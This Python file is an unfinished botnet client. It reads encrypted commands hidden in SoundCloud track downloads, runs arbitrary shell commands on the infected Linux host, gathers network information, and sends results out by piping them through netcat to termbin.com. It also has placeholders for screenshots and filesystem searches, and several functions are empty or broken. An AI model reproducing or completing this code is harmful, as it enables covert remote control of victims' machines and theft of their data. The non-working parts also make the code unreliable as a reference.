import json
import crypt
import time
import base64
import re

from subprocess import call,check_output
from os import system

#Maybe implement sockets instead of needing this library
try:
    import requests
except ImportError as e:
    system("sudo pip install -q requests")

__HASHTAGS__ = ""
__ENC_KEY__ = ""
__IV__ = ""


def encrypt(string):
#Aes256-cbc

def decrypt(string):


class Bot:
    def __init__(self):
        self.apiKey = ""
        self.postData = {"UID":"", "Command":"", "XfilData":"", "Time":""}
        self.oldSongs = []

    #Send requests to soundcloud
    @staticmethod
    def request(self):
        if len(self.oldSongs) > 10:
                del self.oldSongs[10:len(self.oldSongs)]

        r = requests.get("http://api.soundcloud.com/tracks.json?client_id=" + self.apiKey + "&tags=" + __HASHTAGS__)


        while 400 >= r.status_code <= 499:
            #API Key has been burned, need a new one
            #TODO:Create soundcloud user account to look at the buy link and get the new api key!
            #Post to Termbin, wait hr, querry account, If new key found, set self.apiKey. Else repeat

            #This will need some refining
            r = requests.get()
            found = r.text.find('buy')
            #Chop off the .com and just take the api key
            newKey = r.text[found.start():found.end()-4]

            if newKey != self.apiKey:
                self.apiKey = newKey
                return None
            else:
                self.postData['XfilData'] = "API KEY NO LONGER WORKS"
                return None


        webjson = r.json()
        dl_array = []
        for song_num in xrange(len(webjson)):
            if webjson[song_num]['id'] in self.oldSongs:
                continue

            self.oldSongs.insert(0, webjson[song_num]['id'])

            dl_url = webjson[song_num]['download_url'] + "?client_id=" + self.apiKey
            dl_array.append(dl_url)

        enc_command_array = []
        command_array = []
        for song in dl_array:
            r = requests.get(song)
            #TODO: This needs Fixing real bad T_T
            enc_command_array = re.findall('\w{30,}', r.text)

        for command in enc_command_array:
            plain_command = decrypt(base64.b64decode(command))
            command_array.append(plain_command)

        return command_array

        #Pull out all commands and their argument
        #They will be base64 encoded aes256-cbc strings
        #Return the plaintext array


    #Post data to termbin
    @staticmethod
    def post_data(self):
        self.postData['Time'] = time.time()
        encData = base64.b64encode(encrypt(str(self.postData)))

        call(['echo ' + encData + ' | nc termbin.com 9999'], shell=True)

    #Take screenshot
    @staticmethod
    def take_screenshot():


    #Search each file on the system for a specific string
    @staticmethod
    def search_string(self, string):


    #Get networking information
    @staticmethod
    def net_info(self):
        self.postData['Command'] = 'net_info'
        self.postData['XfilData'] = check_output(['ifconfig'])


    #Execute commands locally
    @staticmethod
    def rce_linux(self, command):
        self.postData['XfilData'] = check_output([command])


    #Querry website for continuous integration
    @staticmethod
    def pull_resource(self, info):
        r = requests.get(info)
        with open('/tmp/awdf','w') as RESOURCE:
            RESOURCE.write(r.text)


if __name__ == "__main__":

    bender = Bot()

    while True:
        #Figure out how each method will be called once command is returned
        command = bender.request()

        if command is None:
            #Check back in 1hr, this is done if the API key has been burned. Determined in Bot.request()
            time.sleep(60 * 60)
            continue

        count = 0
        for item in command:
            #Might need to change this, depends if the command or the arguments are first
            if count % 2 == 0:
                continue

            if item == 'take_screenshot':
                bender.take_screenshot()
                bender.post_data()

            elif item == 'search_string':
                #This might need to change depending on the order of the items in the array
                bender.search_string(command[count+1])
                bender.post_data()


            elif item == 'net_info':
                bender.net_info()
                bender.post_data()

            elif item == 'rce_linux':
                #This might need to change depending on the order of the items in the array
                bender.rce_linux(command[count+1])
                bender.post_data()

            elif item == 'pull_resource':
                bender.pull_resource(command[count+1])

        #Make random between 2-5hrs
        time.sleep(60 * 60 * 3)